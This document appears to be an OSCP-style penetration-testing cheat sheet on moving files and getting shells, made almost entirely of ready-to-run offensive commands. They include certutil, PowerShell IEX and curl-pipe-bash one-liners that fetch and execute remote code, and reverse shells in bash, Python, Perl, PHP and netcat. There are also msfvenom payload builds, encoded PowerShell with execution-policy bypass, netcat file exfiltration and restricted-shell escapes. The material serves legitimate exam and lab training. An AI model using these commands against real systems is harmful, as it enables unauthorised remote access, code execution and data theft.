# File transfer & shells (quick)

Placeholders: `LHOST`, `LPORT`, `TARGET`, `FILE`, `USER`, `SHARE`.

Community patterns curated from common OSCP sheets ([0xsyr0/OSCP](https://github.com/0xsyr0/OSCP), [Cheatsheet-God](https://github.com/OlivierLaflamme/Cheatsheet-God)) — rewritten with consistent placeholders.

---

## Host files on Kali

```bash
python3 -m http.server 80
php -S 0.0.0.0:80
ruby -rwebrick -e 'WEBrick::HTTPServer.new(Port:80,DocumentRoot:Dir.pwd).start'
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user simon -password 'Password123!'
```

---

## Windows pull

```cmd
certutil -urlcache -split -f http://LHOST/FILE FILE
certutil -urlcache -f http://LHOST/FILE FILE
powershell -c "iwr http://LHOST/FILE -OutFile FILE"
powershell -c "IEX(IWR http://LHOST/script.ps1 -UseBasicParsing)"
bitsadmin /transfer n http://LHOST/FILE C:\Windows\Temp\FILE
```

### SMB map

```powershell
net use Z: \\LHOST\share /user:simon Password123!
copy Z:\tool.exe C:\Windows\Tasks\
```

### VBScript download (when PS locked down)

```cmd
echo Set a=CreateObject("MSXML2.XMLHTTP") > dl.vbs
echo a.Open "GET","http://LHOST/FILE",False >> dl.vbs
echo a.Send >> dl.vbs
echo If a.Status=200 Then >> dl.vbs
echo Set b=CreateObject("ADODB.Stream") >> dl.vbs
echo b.Open: b.Type=1: b.Write a.responseBody >> dl.vbs
echo b.SaveToFile "FILE",2: b.Close >> dl.vbs
echo End If >> dl.vbs
cscript //nologo dl.vbs
```

---

## Linux pull

```bash
wget http://LHOST/FILE -O FILE
curl http://LHOST/FILE -o FILE
curl http://LHOST/script.sh | bash
scp USER@LHOST:/path/FILE .
```

### No wget/curl — bash `/dev/tcp` mini-curl

```bash
function __curl() {
  read proto server path <<<"$(echo "${1//// }")"
  DOC="/${path// //}"
  HOST="${server//:*}"
  PORT="${server//*:}"
  [[ "$HOST" == "$PORT" ]] && PORT=80
  exec 3<>"/dev/tcp/${HOST}/$PORT"
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read -r line; do [[ "$line" == $'\r' ]] && break; done && cat) <&3
  exec 3>&-
}
__curl http://LHOST/FILE > FILE
```

### Netcat file copy

```bash
# receiver
nc -lnvp LPORT > FILE
# sender
nc TARGET LPORT < FILE
```

### Base64 paste (small files)

```bash
# on Kali
base64 -w0 FILE
# on target
echo 'BASE64...' | base64 -d > FILE
chmod +x FILE
```

---

## Reverse shells

### Linux

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
bash -c 'bash -i >& /dev/tcp/LHOST/443 0>&1'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Windows

```powershell
# Nishang-style (host script on Kali)
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress LHOST -Port LPORT
```

```cmd
nc.exe LHOST LPORT -e cmd.exe
```

### PowerShell encoded command

```bash
# Kali: UTF-16LE base64 for -EncodedCommand
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/a.ps1')" \
  | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

```cmd
powershell -ep bypass -EncodedCommand <BASE64>
```

### msfvenom (common formats)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f aspx -o shell.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o shell.msi
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=443 -f war -o shell.war
```

> Prefer non-Meterpreter shells on exam unless you are sure of Metasploit limits.

---

## Shell upgrade / limited shell breakouts

### Classic TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export SHELL=bash TERM=xterm-256color
```

### From common programs

```text
vi/vim:  :!/bin/bash   or   :set shell=/bin/bash | shell
less/more:  !bash
man:     !bash
nmap (old interactive):  !sh
awk:     awk 'BEGIN {system("/bin/bash")}'
find:    find / -exec /bin/bash \; -quit
```

### BusyBox / constrained

```bash
/bin/busybox sh
busybox nc LHOST LPORT -e /bin/sh
```

---

## Decision tree

```text
Can use PS / certutil?  → Windows HTTP pull
Can use wget/curl?      → Linux HTTP pull
Only bash?              → /dev/tcp helper or base64
Have SMB?               → impacket-smbserver
Have SSH?               → scp / sshfs
Tiny file?              → base64 paste
```
